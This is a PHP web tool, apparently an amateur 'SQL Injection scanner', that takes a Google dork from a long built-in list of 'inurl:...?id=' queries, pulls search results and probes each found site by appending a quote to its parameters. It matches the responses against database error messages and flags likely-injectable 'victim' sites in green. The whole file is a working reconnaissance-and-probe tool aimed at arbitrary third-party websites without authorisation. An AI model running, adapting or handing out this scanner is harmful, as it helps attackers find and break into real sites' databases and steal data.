<?php
	set_time_limit(0);
	ini_set('memory_limit', '64M');
	header('Content-Type: text/html; charset=UTF-8');

	/* Errors By Robot*/
	$error[] = 'You have an error in your SQL';
	$error[] = 'supplied argument is not a valid MySQL result resource in';
	$error[] = 'Division by zero in';
	$error[] = 'Call to a member function';
	$error[] = 'Microsoft JET Database';
	$error[] = 'ODBC Microsoft Access Driver';
	$error[] = 'Microsoft OLE DB Provider for SQL Server';
	$error[] = 'Unclosed quotation mark';
	$error[] = 'Microsoft OLE DB Provider for Oracle';
	$error[] = 'Incorrect syntax near';
	$error[] = 'SQL query failed';
	
	function letItBy(){ ob_flush(); flush(); }
	
	function google_that($query, $page=1){
		
		$resultPerPage=8; //max result per page is 8 (GOOGLE rules)
		
		$start = $page*$resultPerPage;
	
		$url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz={$resultPerPage}&start={$start}&q=" . urlencode($query);
		
		/* Get result */
		$resultFromGoogle = json_decode( http_get($url, true) ,true);

		/* Check result */
		if(isset($resultFromGoogle['responseStatus'])){
			
			/* Check response status */
			if($resultFromGoogle['responseStatus'] != '200') return false; //die( 'The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $resultFromGoogle['responseDetails'] . '<br>' .$url );
			
			/* Count results */
			if(sizeof($resultFromGoogle['responseData']['results']) == 0) return false; //if no results return false
			else return $resultFromGoogle['responseData']['results']; //return the results
		}
		/*
			if this function kill the script, go to --> http://code.google.com/intl/iw/apis/websearch/docs/	AND LEARN!!
		*/
		else
			die('The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $url );

	}
	
	function http_get($url, $safemode = false){
		if($safemode === true) sleep(1); // safe mode, i dont want GOOGLE ban me..
		$im = curl_init($url);
		curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($im, CURLOPT_HEADER, 0);
		return curl_exec($im);
		curl_close();
	}

	function check_injection($url){
		$data = http_get( str_replace("=", "='", $url) );
		$errors = implode("|", $GLOBALS['error']);
		return preg_match("#{$errors}#i", $data);
	}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="Content-Type" content="text/html; charset=UTF-8">
		<title>SQL Injection scanner By Pace Usa 1.0</title>
		<style type="text/css">
			body{ background-color:#000000; font: normal 18px Arial; color:#ffffff;}
			input{ border-width:0px; padding:2px; width:250px; }
			a{ text-decoration:none; color:#ffffff;}
			#button{ width:50px;}
			#result{margin:10px;}
			#result span{display:block;}
			#result .Y{background-color:green;}
			#result .X{background-color:red;}
		</style>
	</head>
	<body>
		<form method="post">
			Dork
			<select onchange="document.getElementById('dork').value=this.options[this.selectedIndex].text;"><!-- By Styx http://thedefaced.net/showthread.php?tid=152 --><option>inurl:trainers.php?id=</option><option>inurl:buy.php?category=</option><option>inurl:article.php?ID=</option><option>inurl:play_old.php?id=</option><option>inurl:declaration_more.php?decl_id=</option><option>inurl:pageid=</option><option>inurl:games.php?id=</option><option>inurl:page.php?file=</option><option>inurl:newsDetail.php?id=</option><option>inurl:gallery.php?id=</option><option>inurl:article.php?id=</option><option>inurl:show.php?id=</option><option>inurl:staff_id=</option><option>inurl:newsitem.php?num=</option><option>inurl:readnews.php?id=</option><option>inurl:top10.php?cat=</option><option>inurl:historialeer.php?num=</option><option>inurl:reagir.php?num=</option><option>inurl:Stray-Questions-View.php?num=</option><option>inurl:forum_bds.php?num=</option><option>inurl:game.php?id=</option><option>inurl:view_product.php?id=</option><option>inurl:newsone.php?id=</option><option>inurl:sw_comment.php?id=</option><option>inurl:news.php?id=</option><option>inurl:avd_start.php?avd=</option><option>inurl:event.php?id=</option><option>inurl:product-item.php?id=</option><option>inurl:sql.php?id=</option><option>inurl:news_view.php?id=</option><option>inurl:select_biblio.php?id=</option><option>inurl:humor.php?id=</option><option>inurl:aboutbook.php?id=</option><option>inurl:ogl_inet.php?ogl_id=</option><option>inurl:fiche_spectacle.php?id=</option><option>inurl:communique_detail.php?id=</option><option>inurl:sem.php3?id=</option><option>inurl:kategorie.php4?id=</option><option>inurl:news.php?id=</option><option>inurl:index.php?id=</option><option>inurl:faq2.php?id=</option><option>inurl:show_an.php?id=</option><option>inurl:preview.php?id=</option><option>inurl:loadpsb.php?id=</option><option>inurl:opinions.php?id=</option><option>inurl:spr.php?id=</option><option>inurl:pages.php?id=</option><option>inurl:announce.php?id=</option><option>inurl:clanek.php4?id=</option><option>inurl:participant.php?id=</option><option>inurl:download.php?id=</option><option>inurl:main.php?id=</option><option>inurl:review.php?id=</option><option>inurl:chappies.php?id=</option><option>inurl:read.php?id=</option><option>inurl:prod_detail.php?id=</option><option>inurl:viewphoto.php?id=</option><option>inurl:article.php?id=</option><option>inurl:person.php?id=</option><option>inurl:productinfo.php?id=</option><option>inurl:showimg.php?id=</option><option>inurl:view.php?id=</option><option>inurl:website.php?id=</option><option>inurl:hosting_info.php?id=</option><option>inurl:gallery.php?id=</option><option>inurl:rub.php?idr=</option><option>inurl:view_faq.php?id=</option><option>inurl:artikelinfo.php?id=</option><option>inurl:detail.php?ID=</option><option>inurl:index.php?=</option><option>inurl:profile_view.php?id=</option><option>inurl:category.php?id=</option><option>inurl:publications.php?id=</option><option>inurl:fellows.php?id=</option><option>inurl:downloads_info.php?id=</option><option>inurl:prod_info.php?id=</option><option>inurl:shop.php?do=part&id=</option><option>inurl:productinfo.php?id=</option><option>inurl:collectionitem.php?id=</option><option>inurl:band_info.php?id=</option><option>inurl:product.php?id=</option><option>inurl:releases.php?id=</option><option>inurl:ray.php?id=</option><option>inurl:produit.php?id=</option><option>inurl:pop.php?id=</option><option>inurl:shopping.php?id=</option><option>inurl:productdetail.php?id=</option><option>inurl:post.php?id=</option><option>inurl:viewshowdetail.php?id=</option><option>inurl:clubpage.php?id=</option><option>inurl:memberInfo.php?id=</option><option>inurl:section.php?id=</option><option>inurl:theme.php?id=</option><option>inurl:page.php?id=</option><option>inurl:shredder-categories.php?id=</option><option>inurl:tradeCategory.php?id=</option><option>inurl:product_ranges_view.php?ID=</option><option>inurl:shop_category.php?id=</option><option>inurl:transcript.php?id=</option><option>inurl:channel_id=</option><option>inurl:item_id=</option><option>inurl:newsid=</option><option>inurl:trainers.php?id=</option><option>inurl:news-full.php?id=</option><option>inurl:news_display.php?getid=</option><option>inurl:index2.php?option=</option><option>inurl:readnews.php?id=</option><option>inurl:top10.php?cat=</option><option>inurl:newsone.php?id=</option><option>inurl:event.php?id=</option><option>inurl:product-item.php?id=</option><option>inurl:sql.php?id=</option><option>inurl:aboutbook.php?id=</option><option>inurl:preview.php?id=</option><option>inurl:loadpsb.php?id=</option><option>inurl:pages.php?id=</option><option>inurl:material.php?id=</option><option>inurl:clanek.php4?id=</option><option>inurl:announce.php?id=</option><option>inurl:chappies.php?id=</option><option>inurl:read.php?id=</option><option>inurl:viewapp.php?id=</option><option>inurl:viewphoto.php?id=</option><option>inurl:rub.php?idr=</option><option>inurl:galeri_info.php?l=</option><option>inurl:review.php?id=</option><option>inurl:iniziativa.php?in=</option><option>inurl:curriculum.php?id=</option><option>inurl:labels.php?id=</option><option>inurl:story.php?id=</option><option>inurl:look.php?ID=</option><option>inurl:newsone.php?id=</option><option>inurl:aboutbook.php?id=</option><option>inurl:material.php?id=</option><option>inurl:opinions.php?id=</option><option>inurl:announce.php?id=</option><option>inurl:rub.php?idr=</option><option>inurl:galeri_info.php?l=</option><option>inurl:tekst.php?idt=</option><option>inurl:newscat.php?id=</option><option>inurl:newsticker_info.php?idn=</option><option>inurl:rubrika.php?idr=</option><option>inurl:rubp.php?idr=</option><option>inurl:offer.php?idf=</option><option>inurl:art.php?idm=</option><option>inurl:title.php?id=</option></select>
			<input type="text" id="dork" name="dork" value="<?php echo (isset($_POST['dork']{0})) ? htmlentities($_POST['dork']) : 'inurl:php?id='; ?>" />
			<input type="submit" value="Start" id="button"/>
		</form>
		<?php
			if(isset($_POST['dork']{0})){
				
				echo '<div id="result">Start..<br>';			
				letItBy();			
				for($googlePage = 1; $googlePage <= 10; $googlePage++){
				
					$googleResult = google_that($_POST['dork'], $googlePage);
					if(!$googleResult){
						echo 'google dont heve more result, so I done..(?)';
						break;
					}
					
					for($victim = 0; $victim < sizeof($googleResult); $victim++){
					
						if(check_injection($googleResult[$victim]['unescapedUrl'])){
							echo '<span class="Y">';
						//	file_put_contents("log.txt", "{$googleResult[$victim]['unescapedUrl']}\n");
						}
						else echo '<span class="X">';
						
						echo "<a href=\"{$googleResult[$victim]['unescapedUrl']}\" target='_blank'>{$googleResult[$victim]['titleNoFormatting']}</a></span>\n";
						letItBy();
					}
				}
				echo '</div>';
			}
		?>
		Powerd By google.
	</body>
</html>
